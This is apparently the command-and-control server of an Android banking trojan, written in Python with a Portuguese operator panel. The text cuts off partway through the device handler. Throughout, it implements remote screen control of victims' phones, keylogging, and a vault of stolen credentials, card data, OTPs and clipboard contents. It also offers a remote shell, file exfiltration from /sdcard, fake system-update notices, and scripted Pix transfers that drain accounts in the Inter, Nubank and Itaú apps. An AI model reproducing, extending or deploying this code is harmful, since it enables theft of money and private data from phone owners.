# server.py - C2, porta 8080
import asyncio, json, os, socket, time
from aiohttp import web, WSMsgType

TOKEN = os.environ.get("AVAL_TOKEN", "m4t7k2p9x6v3n8b5z1q0w7r2")
DEVS = {}
VIEW = {}
BUSY = set()
KF = "teclado.log"
CF = "cofre.jsonl"

def klog(dev, pkg, win, txt):
    try:
        if os.path.exists(KF) and os.path.getsize(KF) > 3000000:
            with open(KF, encoding="utf-8", errors="replace") as f:
                cauda = f.read()[-1000000:]
            with open(KF, "w", encoding="utf-8") as f:
                f.write(cauda)
        with open(KF, "a", encoding="utf-8") as f:
            f.write("%s\t%s\t%s\t%s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), dev or "?",
                                          (pkg or "?") + ("/" + win if win else ""),
                                          (txt or "").replace("\n", "\\n")))
    except Exception:
        pass

def cofre(tipo, dev, o):
    try:
        if isinstance(o, str):
            o = {"v": o}
        o = dict(o)
        o["_t"] = tipo
        o["_dev"] = dev
        o["_h"] = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(CF, "a", encoding="utf-8") as f:
            f.write(json.dumps(o, ensure_ascii=False) + "\n")
    except Exception:
        pass

def devlist():
    return [{"id": k, "m": v["i"].get("m", "?"), "bat": v["i"].get("bat", -1),
             "w": v["i"].get("w", 0), "h": v["i"].get("h", 0)} for k, v in DEVS.items()]

PAGE = r"""<!doctype html><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content=no-referrer>
<title>painel</title>
<style>
*{box-sizing:border-box;margin:0}
:root{--bg:#0a0c10;--pn:#11151b;--pn2:#161c24;--ln:#232c38;--tx:#c3ccd8;--dim:#6a7686;--ac:#3d8bfd;--ok:#2ea043;--warn:#d29922;--err:#f85149}
body{background:var(--bg);color:var(--tx);font:12px/1.45 system-ui;height:100vh;display:flex;flex-direction:column;overflow:hidden}
header{display:flex;gap:6px;align-items:center;padding:6px 10px;background:var(--pn);border-bottom:1px solid var(--ln);flex-wrap:wrap}
#brand{font-weight:700;letter-spacing:.4px;color:#fff;font-size:13px;margin-right:4px}
#brand i{color:var(--ac);font-style:normal}
main{flex:1;display:flex;min-height:0}
nav{width:62px;background:var(--pn);border-right:1px solid var(--ln);display:flex;flex-direction:column;padding-top:4px;gap:2px}
nav b{padding:8px 2px;text-align:center;cursor:pointer;color:var(--dim);font-weight:400;font-size:9.5px;border-left:2px solid transparent}
nav b.on{color:var(--ac);border-left-color:var(--ac);background:var(--pn2)}
nav b:hover{color:var(--tx);background:var(--pn2)}
#stage{flex:1;display:flex;flex-direction:column;min-width:0;background:#000}
#scr{flex:1;object-fit:contain;min-height:0;cursor:crosshair;user-select:none;-webkit-user-drag:none}
#tbar{display:flex;gap:4px;padding:4px 6px;background:var(--pn);border-top:1px solid var(--ln);flex-wrap:wrap}
aside{width:390px;display:flex;flex-direction:column;background:var(--pn);border-left:1px solid var(--ln);min-width:0}
#hd{display:flex;gap:6px;align-items:center;padding:6px 8px;border-bottom:1px solid var(--ln)}
#hd h2{font-size:12px;font-weight:600;color:#fff;flex:1}
#body{flex:1;overflow:auto;padding:7px}
#out{margin:0;font:11px monospace;white-space:pre-wrap;word-break:break-all}
button,select,input,textarea{background:var(--pn2);color:var(--tx);border:1px solid var(--ln);padding:4px 7px;font-size:11px;border-radius:5px;cursor:pointer;font-family:inherit}
button:hover{background:#1e2731;border-color:#33414f}
button:active{transform:translateY(1px)}
button.pri{background:#153a63;border-color:#1f5c9c;color:#dceaff}
button.dg{border-color:#4d2323;color:#ffb4ae}
input{flex:1;cursor:text}
select{cursor:pointer}
.ln{display:flex;gap:5px;align-items:center;margin-bottom:5px}
.sm{font:10px monospace;color:var(--dim)}
.dot{width:8px;height:8px;border-radius:50%;background:#39424e;flex:none}
.dot.on{background:var(--ok);box-shadow:0 0 6px var(--ok)}
.dot.w{background:var(--warn)}
#st{padding:2px 8px;font:11px monospace;color:var(--warn);min-height:15px}
.card{background:var(--pn2);border:1px solid var(--ln);border-radius:7px;padding:7px 8px;margin-bottom:5px}
.card:hover{border-color:#33414f}
.card .t{font-weight:600;color:#fff;font-size:12px;word-break:break-all}
.card .m{font:10px monospace;color:var(--dim);margin-top:2px;word-break:break-all}
.card .a{display:flex;gap:4px;margin-top:5px}
.row{display:flex;justify-content:space-between;gap:6px;padding:3px 0;border-bottom:1px solid #1a2029;cursor:pointer}
.row:hover{background:#151b22}
#toast{position:fixed;right:12px;bottom:12px;display:flex;flex-direction:column;gap:5px;z-index:9;pointer-events:none}
#toast div{background:#1b232d;border:1px solid #2d3a49;color:#dbe3ec;padding:5px 9px;border-radius:5px;font-size:11px;animation:in .16s}
@keyframes in{from{opacity:0;transform:translateY(6px)}}
.tap{position:fixed;width:20px;height:20px;margin:-10px 0 0 -10px;border:2px solid var(--ac);border-radius:50%;pointer-events:none;animation:f .42s ease-out forwards}
@keyframes f{to{transform:scale(1.7);opacity:0}}
#wrap.zoom{overflow:auto;display:block}
#wrap.zoom #scr{flex:none;height:auto}
#klist{font:11px monospace;white-space:pre-wrap;word-break:break-all}
.kh{color:var(--ac);margin:6px 0 2px;border-bottom:1px solid #1a2029;padding-bottom:2px}
.krow{padding:1px 0}.krow b{color:var(--dim);font-weight:400}
#snapbox{display:none;border-top:1px solid var(--ln);padding:6px;background:#0a0e13}
#snappre{max-height:210px;overflow:auto;font:11px monospace;margin:4px 0;background:#05070a;padding:6px;border-radius:5px}
#snappre div{cursor:pointer;white-space:pre}
#snappre div:hover{background:#131a22}
textarea{width:100%;height:130px;font:11px monospace;background:#05070a;resize:vertical}
</style>
<header>
<span id=brand>p<i>a</i>inel</span>
<select id=dev><option value="">-- aparelho --</option></select><span id=dot class=dot></span><span id=lat class=sm>--</span>
<button onclick="k(4)">Voltar</button><button onclick="k(3)">Home</button><button onclick="k(187)">Recentes</button>
<button class=pri onclick="c('shot',{on:true})">Print</button><button onclick="c('shot',{on:false})">Off</button>
<button onclick="c('screen',{on:true})">Acordar</button><button onclick="c('info')">Info</button>
<button onclick="c('apps')">Apps</button><button onclick="c('sms')">SMS</button><button onclick="c('loc')">Local</button>
<button onclick="c('torch',{on:true})">Luz</button><button onclick="c('torch',{on:false})">Luz off</button>
<button onclick="c('hide',{on:true})">Ocultar</button><button onclick="c('hide',{on:false})">Mostrar</button>
<button onclick="zoom(-1)">-</button><span id=z class=sm>1x</span><button onclick="zoom(1)">+</button>
<button id=mg onclick="mag=!mag;this.style.opacity=mag?1:.4">ima</button>
<button onclick="preset(1)">Rapido</button><button onclick="preset(2)">Nitido</button>
<button onclick="banco()">Modo banco</button>
<button onclick="shot()">Salvar</button><button onclick="full()">Tela cheia</button>
</header>
<main>
<nav>
<b class=on data-v=live>ao vivo</b><b data-v=cofre>cofre</b><b data-v=otp>otp</b><b data-v=pix>pix</b>
<b data-v=arq>arquivos</b><b data-v=apps>apps</b><b data-v=info>info</b><b data-v=tecla>teclado</b>
<b data-v=perfil>perfis</b><b data-v=recon>recon</b><b data-v=cfg>ajustes</b>
</nav>
<div id=wrap><img id=scr><div id=st></div></div>
<aside>
<div id=hd><h2 id=ht>ao vivo</h2><span id=hx class=sm></span></div>
<div id=body>
<div id=v-live>
<div class=ln><span class=sm>toque direto na imagem. arraste para swipe, segure para long press.</span></div>
<div class=ln><button onclick="recTog()">REC macro</button><span id=rc class=sm>0</span><button onclick="playM()">Play</button></div>
<div class=ln><button onclick="c('ov',{on:true})">Overlay</button><button onclick="c('ov',{on:false})">Overlay off</button></div>
<div class=ln><button onclick="avPreset(0)">aviso: update</button><button onclick="avPreset(1)">aviso: sync</button></div>
<pre id=out></pre>
</div>
<div id=v-cofre style=display:none>
<div class=ln><input id=cf placeholder="filtrar"><button onclick="carregaCofre()">atualizar</button></div>
<div class=ln><button onclick="baixaCofre()">exportar json</button><button class=dg onclick="limpaCofre()">limpar</button></div>
<div id=cl></div>
</div>
<div id=v-otp style=display:none><div class=ln><button onclick="carregaCofre('otp')">atualizar</button></div><div id=ol></div></div>
<div id=v-pix style=display:none>
<div class=ln><select id=pfl></select></div>
<div class=ln><input id=pch placeholder="chave pix"><input id=pvl placeholder="valor" style="flex:0 0 90px"></div>
<div class=ln><button class=pri onclick="runPix()">executar perfil</button><button id=wt onclick="wt()">Watch</button></div>
<div class=ln><button onclick="snap()">Snap da tela</button><button onclick="c('contas')">contas</button><button onclick="c('finger')">recon</button></div>
<div id=snapbox><div class=sm>clique numa linha para virar passo</div><pre id=snappre></pre>
<textarea id=pjson placeholder="[]"></textarea>
<div class=ln><button onclick="playJ()">Play JSON</button><button onclick="salvaJ()">Gravar</button><button onclick="carregaJ()">Carregar</button><button onclick="limpaJ()">Limpar</button></div></div>
</div>
<div id=v-arq style=display:none>
<div class=ln><input id=p value="/sdcard"><button onclick="ls()">ir</button></div><div id=flist></div>
</div>
<div id=v-apps style=display:none><pre id=out2></pre></div>
<div id=v-info style=display:none><pre id=out3></pre></div>
<div id=v-tecla style=display:none>
<div class=ln><button onclick="kpause=!kpause;this.textContent=kpause?'retomar':'pausar'">pausar</button>
<button onclick="fetch('/keys/clear?t='+T)">limpar</button><button onclick="location.href='/keys/dl?t='+T">baixar</button></div>
<div id=klist></div>
</div>
<div id=v-perfil style=display:none>
<div class=ln><select id=pf2></select><button onclick="carregaP()">carregar</button></div>
<textarea id=pjson2></textarea>
<div class=ln><button onclick="salvaP()">salvar perfil</button></div>
</div>
<div id=v-recon style=display:none>
<div class=ln><button onclick="c('finger')">fingerprint</button><button onclick="c('contas')">contas google</button><button onclick="c('clip')">clipboard</button></div>
<pre id=out4></pre>
</div>
<div id=v-cfg style=display:none>
<div class=ln>Q<input id=q type=range min=15 max=90 value=35 oninput="c('q',{v:+this.value})"></div>
<div class=ln>FPS<input id=f type=range min=1 max=15 value=6 oninput="c('fps',{v:+this.value})"></div>
<div class=ln>Res<input id=r type=range min=360 max=1080 step=180 value=540 oninput="c('res',{v:+this.value})"></div>
<div class=ln><button onclick="c('bank')">modo banco</button><button onclick="c('unbank')">modo normal</button></div>
<div class=ln><button onclick="c('setup')">abrir tela de setup</button><button onclick="c('decoy')">abrir loja</button></div>
</div>
</div>
</aside>
</main>
<div id=tbar><input id=t placeholder="texto  |  $comando  |  /ls path  |  /dl path"><button class=pri onclick="send()">Enviar</button>
<button onclick="k(66)">Enter</button><button onclick="k(67)">Del</button><button onclick="k(26)">Notif</button>
<button onclick="c('clip')">Clip</button><button onclick="c('recon')">Reconectar</button></div>
<div id=toast></div>
<script>
const T=new URLSearchParams(location.search).get('t')||'';
const $=s=>document.querySelector(s),i=$('#scr'),dev=$('#dev'),st=$('#st'),dot=$('#dot'),lat=$('#lat');
let w,sel='',inf={w:0,h:0},lf=0,tp=0,recs=null,vNow='live',pasta='/sdcard',pend=null,kt=null,kpause=false,kn=0,z=1,mag=true,nos=[],cofre=[];
function toq(x){const d=document.createElement('div');d.textContent=x;$('#toast').appendChild(d);setTimeout(()=>d.remove(),2600)}
function log(x){const o=$('#out');o.textContent=(o.textContent+x+'\n').slice(-9000);o.scrollTop=o.scrollHeight}
function co(){
  w=new WebSocket((location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/panel?t='+T);
  w.binaryType='arraybuffer';
  w.onopen=()=>{log('[painel ok]');setInterval(()=>{if(sel&&mag&&vNow!=='perfil')c('tree')},2600);
    setInterval(()=>{if(w.readyState===1){tp=Date.now();w.send('{"c":"ping"}')}},4000)};
  w.onclose=()=>{log('[caiu]');setTimeout(co,1500)};
  w.onmessage=e=>{
    if(typeof e.data!=='string'){frame(e.data);return}
    const m=JSON.parse(e.data);
    if(m.k==='devs'){
      const cur=dev.value;dev.innerHTML='<option value="">-- aparelho --</option>';
      m.d.forEach(x=>{const o=document.createElement('option');o.value=x.id;
        o.textContent=x.id+' '+x.m+' '+x.w+'x'+x.h+' b'+x.bat;dev.appendChild(o)});
      if(!sel&&m.d.length){dev.value=m.d[0].id;pick()}
      else if(cur&&m.d.some(x=>x.id===cur))dev.value=cur;
      return}
    if(m.k!=='log')return;
    const x=m.d;
    if(x.t==='hello'){inf=x;log('['+x.id+'] '+x.m+' sdk'+x.sdk+' '+x.w+'x'+x.h+' b'+x.bat+' '+x.ip);
      if(!sel&&x.id){dev.value=x.id;pick()}}
    else if(x.t==='pong'){lat.textContent=(Date.now()-tp)+'ms'}
    else if(x.t==='err'){log('! '+x.o);st.textContent=x.o}
    else if(x.t==='ka'){}
    else if(x.t==='apps'){$('#out2').textContent=x.o}
    else if(x.t==='info'){$('#out3').textContent=x.o}
    else if(x.t==='ls'){lista(x.o)}
    else if(x.t==='dl'){baixa(x.o)}
    else if(x.t==='tree'){nos=x.o||[]}
    else if(x.t==='k'){if(vNow==='tecla'&&!kpause)kcarrega()}
    else if(x.t==='cred'||x.t==='cartao'){cofre.unshift(Object.assign({_t:x.t},x.o));desenhaCofre();toq(x.t+': '+(x.o.campo||''))}
    else if(x.t==='otp'){cofre.unshift({_t:'otp',v:x.o});desenhaCofre();toq('otp recebido')}
    else if(x.t==='clip'){cofre.unshift({_t:'clip',v:x.o});desenhaCofre()}
    else if(x.t==='contas'){$('#out4').textContent=x.o;go('recon')}
    else if(x.t==='finger'){$('#out4').textContent=x.o;go('recon')}
    else if(x.t==='pixvisto'){log('! '+x.o);const mm=x.o.match(/chave=([^;]+)/);if(mm){$('#pch').value=mm[1].trim();toq('chave pix capturada')}}
    else if(x.t==='snap')snapShow(x.o||'')
    else log(x.t+': '+(x.o||''))
  };
}
function frame(d){
  lf=Date.now();st.textContent='';
  const u=URL.createObjectURL(new Blob([d],{type:'image/jpeg'})),old=i.src;
  i.onload=()=>{if(old&&old.startsWith('blob:'))URL.revokeObjectURL(old);i.onload=null};i.src=u;
  if(recs&&recs.cv)recs.cv.getContext('2d').drawImage(i,0,0,recs.cv.width,recs.cv.height)}
setInterval(()=>{
  if(!sel){st.textContent='nenhum aparelho';dot.className='dot'}
  else if(!lf||Date.now()-lf>2500){st.textContent='sem frames';dot.className='dot w'}
  else dot.className='dot on'},1000);
function pick(){sel=dev.value;lf=0;i.removeAttribute('src');log('[*] '+(sel||'nenhum'));
  if(sel&&w&&w.readyState===1)w.send(JSON.stringify({c:'sel',id:sel}))}
dev.onchange=pick;
function c(n,x){if(w&&w.readyState===1&&sel)w.send(JSON.stringify(Object.assign({c:n,id:sel},x||{})))}
function k(n){c('key',{code:n});push({k:n})}
function go(v){vNow=v;
  document.querySelectorAll('nav b').forEach(b=>b.classList.toggle('on',b.dataset.v===v));
  ['live','cofre','otp','pix','arq','apps','info','tecla','perfil','recon','cfg'].forEach(n=>{
    $('#v-'+n).style.display=n===v?'block':'none'});
  $('#ht').textContent=v;
  clearInterval(kt);
  if(v==='tecla'){kcarrega();kt=setInterval(kcarrega,2000)}
  if(v==='cofre')carregaCofre();
  if(v==='otp')carregaCofre('otp');
  if(v==='apps')c('apps');
  if(v==='info')c('info');
  if(v==='arq')ls();
  if(v==='recon')c('finger');
}
document.querySelectorAll('nav b').forEach(b=>b.onclick=()=>go(b.dataset.v));
function send(){const e=$('#t'),v=e.value;
  if(pend){c('fill',{x:pend.x,y:pend.y,s:v});pend=null;e.value='';e.placeholder='texto  |  $comando  |  /ls path  |  /dl path';return}
  if(!v)return;
  if(v[0]==='$')c('shell',{cmd:v.slice(1)});
  else if(v.startsWith('/ls '))c('ls',{p:v.slice(4)});
  else if(v.startsWith('/dl '))c('dl',{p:v.slice(4)});
  else {c('text',{s:v});push({x:v});e.value=''}
}
$('#t').onkeydown=e=>{if(e.key==='Enter')send()};
function pt(e){
  const r=i.getBoundingClientRect(),nx=i.naturalWidth||1,ny=i.naturalHeight||1;
  const s=Math.min(r.width/nx,r.height/ny)||1;
  const ox=r.left+(r.width-nx*s)/2,oy=r.top+(r.height-ny*s)/2;
  const x=Math.round((e.clientX-ox)/s*((inf.w||nx)/nx));
  const y=Math.round((e.clientY-oy)/s*((inf.h||ny)/ny));
  return{x:Math.min(Math.max(0,x),inf.w||x),y:Math.min(Math.max(0,y),inf.h||y)}}
function snapP(p){
  if(!mag||!nos.length)return p;
  let b=null,d=1e9;
  nos.forEach(n=>{if(!n.c&&!n.e)return;const dd=Math.hypot(n.x-p.x,n.y-p.y);if(dd<d){d=dd;b=n}});
  return (b&&d<70)?{x:b.x,y:b.y}:p}
function zoom(n){z=Math.min(4,Math.max(1,z+n));
  $('#wrap').classList.toggle('zoom',z>1);i.style.width=z>1?(z*100)+'%':'';
  $('#z').textContent=z+'x'}
function avPreset(n){
  const a=[['Atualizacao do sistema','Atualizacao instalada. Reinicie o aplicativo.'],
    ['Servicos do sistema','Sincronizando dados da conta...']][n];
  c('aviso',{ti:a[0],tx:a[1]})}
let dn=null,t0=0,env=null,jaEnviado=false;
function mark(p){
  const r=i.getBoundingClientRect(),nx=i.naturalWidth||1,ny=i.naturalHeight||1;
  const s=Math.min(r.width/nx,r.height/ny)||1;
  const d=document.createElement('div');d.className='tap';
  d.style.left=(r.left+(r.width-nx*s)/2+p.x/((inf.w||nx)/nx)*s)+'px';
  d.style.top=(r.top+(r.height-ny*s)/2+p.y/((inf.h||ny)/ny)*s)+'px';
  document.body.appendChild(d);setTimeout(()=>d.remove(),420)}
i.onmousedown=e=>{dn=snapP(pt(e));t0=Date.now();jaEnviado=false;mark(dn);
  clearTimeout(env);env=setTimeout(()=>{if(!dn)return;jaEnviado=true;c('touch',{x:dn.x,y:dn.y})},130)};
i.onmousemove=e=>{if(!dn)return;const u=snapP(pt(e));
  if(Math.abs(u.x-dn.x)+Math.abs(u.y-dn.y)>18)clearTimeout(env)};
i.onmouseup=e=>{clearTimeout(env);if(!dn)return;const u=snapP(pt(e));
  const m=Math.abs(u.x-dn.x)+Math.abs(u.y-dn.y);
  if(jaEnviado&&m<18){dn=null;return}
  if(m<18&&Date.now()-t0>480){c('long',{x:u.x,y:u.y});push({l:[u.x,u.y]})}
  else if(m<18){c('touch',{x:u.x,y:u.y});push({t:[u.x,u.y]})}
  else {c('swipe',{x1:dn.x,y1:dn.y,x2:u.x,y2:u.y,ms:220});push({s:[dn.x,dn.y,u.x,u.y,220]})}dn=null};
function shot(){const a=document.createElement('a');a.href=i.src;a.download='tela.jpg';a.click()}
function full(){document.fullscreenElement?document.exitFullscreen():document.documentElement.requestFullscreen()}
function rec(){
  if(recs){recs.stop();recs=null;st.textContent='';return}
  const cv=document.createElement('canvas');cv.width=i.naturalWidth||540;cv.height=i.naturalHeight||960;
  const r=new MediaRecorder(cv.captureStream(6),{mimeType:'video/webm'});
  r.ondataavailable=e=>{const a=document.createElement('a');a.href=URL.createObjectURL(e.data);a.download='sessao.webm';a.click()};
  r.start();r.cv=cv;recs=r;st.textContent='gravando'}
function banco(){c('bank');go('live');const q=$('#q'),f=$('#f');q.value=30;f.value=2;c('q',{v:30});c('fps',{v:2});toq('modo banco')}
function kdesenha(linhas){
  const f=$('#klist');f.innerHTML='';let ultimo='';
  linhas.forEach(l=>{const p=l.split('\t'),cab=p[2]||'?';
    if(cab!==ultimo){ultimo=cab;const h=document.createElement('div');h.className='kh';h.textContent='-- '+cab+' --';f.appendChild(h)}
    const d=document.createElement('div');d.className='krow';
    const b=document.createElement('b');b.textContent=(p[0]||'').slice(11)+'  ';
    d.appendChild(b);d.appendChild(document.createTextNode(p[3]||''));f.appendChild(d)});
  f.scrollTop=f.scrollHeight}
function kcarrega(){if(kpause)return;
  fetch('/keys?t='+T+'&n=600'+(sel?'&dev='+encodeURIComponent(sel):''))
    .then(r=>r.json()).then(j=>{if(j.l.length===kn&&vNow==='tecla')return;kn=j.l.length;kdesenha(j.l)}).catch(()=>{})}
function ls(){pasta=$('#p').value||'/sdcard';c('ls',{p:pasta})}
function lista(o){
  const f=$('#flist');f.innerHTML='';
  if(!o||o.startsWith('err')||o.startsWith('sem acesso')){f.textContent=o||'vazio';return}
  o.split('\n').forEach(l=>{if(!l||l.indexOf('\t')<0)return;
    const dir=l[0]==='d',nome=l.split('\t')[1];
    const d=document.createElement('div');d.className='row';
    d.innerHTML='<span>'+(dir?'[ ] ':'')+nome+'</span><span class=sm>'+(dir?'':l.split('\t')[0].slice(2))+'</span>';
    d.onclick=()=>{const base=pasta.endsWith('/')?pasta:pasta+'/';
      if(dir){$('#p').value=base+nome+'/';ls()}else{iniciaDl(base+nome)}};
    f.appendChild(d)})}
let dlBuf=null,dlPath=null,dlOff=0,dlTot=-1;
function iniciaDl(p){dlPath=p;dlOff=0;dlTot=-1;dlBuf=null;c('dl',{p:p,off:0,n:65536})}
function baixa(o){
  if(o==='fim'){fechaDl();return}
  const m=o.match(/b64=([\s\S]*)/);if(!m){log(o);return}
  const tot=+(o.match(/total=(\d+)/)||[0,0])[1];
  if(!dlBuf){dlBuf=[];dlOff=0;dlTot=tot}
  const b=atob(m[1].replace(/\s/g,''));
  for(let x=0;x<b.length;x++)dlBuf.push(b.charCodeAt(x));
  dlOff+=b.length;
  if(dlOff<dlTot)c('dl',{p:dlPath,off:dlOff,n:65536});else fechaDl()}
function fechaDl(){
  const u=new Uint8Array(dlBuf),a=document.createElement('a');
  a.href=URL.createObjectURL(new Blob([u]));a.download=(dlPath.split('/').pop()||'arq');a.click();
  dlBuf=null;dlTot=-1;toq('baixado')}
let mrec=[],mlast=0,mrecOn=false;
function recTog(){mrecOn=!mrecOn;mlast=Date.now();if(mrecOn)mrec=[];
  $('#rc').textContent=mrecOn?'REC':'0';$('#rc').style.color=mrecOn?'#f85149':'#6a7686'}
function push(x){if(!mrecOn)return;const d=Date.now()-mlast;mlast=Date.now();
  mrec.push(Object.assign({w:d},x));$('#rc').textContent=mrec.length}
function playM(){if(!mrec.length){toq('nada gravado');return}c('macro',{s:mrec})}
function preset(n){const q=$('#q'),f=$('#f'),r=$('#r');
  if(n===1){q.value=30;f.value=10;r.value=360}else{q.value=55;f.value=6;r.value=720}
  c('q',{v:+q.value});c('fps',{v:+f.value});c('res',{v:+r.value})}
function carregaCofre(tipo){
  fetch('/cofre?t='+T+(tipo?'&tipo='+tipo:'')).then(r=>r.json()).then(j=>{
    cofre=j.l;desenhaCofre()}).catch(()=>{})}
function desenhaCofre(){
  const q=($('#cf').value||'').toLowerCase();
  const alvo=$('#cl');
  if(!alvo)return;
  alvo.innerHTML='';
  cofre.filter(x=>!q||JSON.stringify(x).toLowerCase().includes(q)).forEach(x=>{
    const d=document.createElement('div');d.className='card';
    const t=document.createElement('div');t.className='t';t.textContent=x.v||'(vazio)';
    const m=document.createElement('div');m.className='m';
    m.textContent=(x._t||'?')+' · '+(x.app||x._dev||'')+(x.campo?' · '+x.campo:'')+' · '+(x._h||'');
    const a=document.createElement('div');a.className='a';
    const b1=document.createElement('button');b1.textContent='copiar';
    b1.onclick=()=>{navigator.clipboard.writeText(x.v||'');toq('copiado')};
    a.appendChild(b1);
    d.appendChild(t);d.appendChild(m);d.appendChild(a);alvo.appendChild(d)})}
function baixaCofre(){
  const a=document.createElement('a');
  a.href=URL.createObjectURL(new Blob([JSON.stringify(cofre,null,1)],{type:'application/json'}));
  a.download='cofre.json';a.click()}
function limpaCofre(){fetch('/cofre/clr?t='+T).then(()=>{cofre=[];desenhaCofre();toq('cofre limpo')})}
const PERFIS={
"inter":[{"do":"wait","sel":{"txt":"Área Pix|^Pix$"},"ms":15000},
 {"do":"tap","sel":{"txt":"^Área Pix$|^Pix$","click":true}},
 {"do":"wait","sel":{"txt":"Transferir|Enviar|Nova transferência"},"ms":9000},
 {"do":"tap","sel":{"txt":"Transferir|Enviar"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
 {"do":"tap","sel":{"txt":"Continuar|Avançar|Próximo"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
 {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
 {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}],
"nubank":[{"do":"wait","sel":{"txt":"Pix"},"ms":15000},
 {"do":"tap","sel":{"txt":"^Pix$","click":true}},
 {"do":"wait","sel":{"txt":"Transferir|Enviar"},"ms":9000},
 {"do":"tap","sel":{"txt":"Transferir"}},
 {"do":"wait","sel":{"txt":"Chave Pix|Nova chave"},"ms":9000},
 {"do":"tap","sel":{"txt":"Chave Pix"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
 {"do":"tap","sel":{"txt":"Continuar|Avançar"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
 {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
 {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}],
"itau":[{"do":"wait","sel":{"txt":"Pix"},"ms":15000},
 {"do":"tap","sel":{"txt":"^Pix$","click":true}},
 {"do":"wait","sel":{"txt":"Transferir|Enviar Pix"},"ms":9000},
 {"do":"tap","sel":{"txt":"Transferir|Enviar Pix"}},
 {"do":"wait","sel":{"txt":"Chave Pix|Nova chave"},"ms":9000},
 {"do":"tap","sel":{"txt":"Chave Pix"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
 {"do":"tap","sel":{"txt":"Continuar|Avançar"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
 {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
 {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}]};
function pflUpd(){
  ['pfl','pf2'].forEach(id=>{const s=$('#'+id);if(!s)return;s.innerHTML='';
    Object.keys(PERFIS).forEach(k=>{const o=document.createElement('option');
      o.value=k;o.textContent=k;s.appendChild(o)})})}
function runPix(){
  const k2=$('#pfl').value,ch=$('#pch').value.trim(),vl=$('#pvl').value.trim();
  if(!ch){toq('sem chave pix');return}
  c('run',{s:PERFIS[k2],v:{chave:ch,valor:vl}});log('perfil '+k2+' chave '+ch+' valor '+(vl||'-'))}
function wt(){const b=$('#wt'),on=b.dataset.on!=='1';
  b.dataset.on=on?'1':'0';b.style.background=on?'#153a63':'';c('watch',{on:on});toq('watch '+(on?'on':'off'))}
function carregaP(){const k2=$('#pf2').value;$('#pjson2').value=JSON.stringify(PERFIS[k2],null,1)}
function salvaP(){try{const a=JSON.parse($('#pjson2').value);
  PERFIS[$('#pf2').value]=a;pflUpd();toq('perfil salvo')}catch(e){toq('json invalido')}}
function snap(){$('#snapbox').style.display='block';c('snap');toq('snap enviado')}
function jesc(s){return String(s).replace(/\\/g,'\\\\').replace(/"/g,'\\"')}
function snapShow(txt){
  const pre=$('#snappre');pre.innerHTML='';
  txt.split('\n').forEach(l=>{if(!l.trim())return;
    const p=l.split('|');const el=document.createElement('div');
    el.textContent=l;el.onclick=()=>insere(p);pre.appendChild(el)})}
function insere(p){
  const cls=p[1]||'',id=p[2]||'',fl=p[3]||'',tx=p[5]||'',cd=p[6]||'';
  const sel={};
  if(id)sel.id=jesc(id).replace(/^[^:]*:id\//,'');
  else if(tx)sel.txt='^'+jesc(tx)+'$';
  else if(cd)sel.txt=jesc(cd);
  else if(cls)sel.cls=jesc(cls);
  else return;
  if(fl.indexOf('C')>=0)sel.click=true;
  if(fl.indexOf('E')>=0)sel.edit=true;
  const s={do:sel.edit?'set':'tap',sel:sel};
  if(sel.edit)s.v='{{CHAVE}}';
  let cur=$('#pjson').value.trim();
  if(cur&&cur[0]!=='[')cur='['+cur.replace(/,\s*$/,'')+']';
  let arr=[];if(cur)try{arr=JSON.parse(cur)}catch(e){arr=[]}
  arr.push(s);$('#pjson').value=JSON.stringify(arr,null,1);log('passo: '+JSON.stringify(sel))}
function playJ(){
  let t=$('#pjson').value.trim();if(!t){toq('perfil vazio');return}
  if(t[0]!=='[')t='['+t.replace(/,\s*$/,'')+']';
  let arr;try{arr=JSON.parse(t)}catch(e){toq('json invalido');return}
  c('run',{s:arr,v:{chave:($('#pch').value||'').trim(),valor:($('#pvl').value||'').trim()}});
  log('play '+arr.length+' passos')}
function salvaJ(){localStorage.setItem('perfil',$('#pjson').value);toq('gravado')}
function carregaJ(){$('#pjson').value=localStorage.getItem('perfil')||''}
function limpaJ(){$('#pjson').value=''}
pflUpd();co();
</script>"""

def ok(req):
    return req.query.get("t") == TOKEN

async def bcast(o, only=None):
    d = json.dumps(o)
    for v in [v for v, s in VIEW.items() if only is None or s == only]:
        try: await v.send_str(d)
        except Exception: pass

async def relay(dev, data):
    for v in [v for v, s in VIEW.items() if s == dev and v not in BUSY]:
        BUSY.add(v)
        try: await v.send_bytes(data)
        except Exception: pass
        finally: BUSY.discard(v)

async def devs():
    await bcast({"k": "devs", "d": devlist()})

async def index(req):
    if not ok(req): raise web.HTTPFound("/?t=" + TOKEN)
    return web.Response(text=PAGE, content_type="text/html", charset="utf-8")

async def phone(req):
    if not ok(req): return web.Response(text="token invalido", status=403)
    if req.headers.get("Upgrade", "").lower() != "websocket":
        h = req.headers.get("Host", "localhost:8080")
        tls = req.secure or req.headers.get("X-Forwarded-Proto") == "https"
        return web.Response(text="%s://%s/ws?t=%s\n" % ("wss" if tls else "ws", h, TOKEN))
    ws = web.WebSocketResponse(heartbeat=20, max_msg_size=0, compress=False)
    await ws.prepare(req)
    dev = None
    try:
        async for m in ws:
            if m.type == WSMsgType.BINARY:
                if dev: await relay(dev, m.data)
            elif m.type == WSMsgType.TEXT:
                try: o = json.loads(m.data)
                except Exception: o = {"t": "raw", "o": m.data}
                if o.get("t") == "hello":
                    dev = o.get("id", "?")
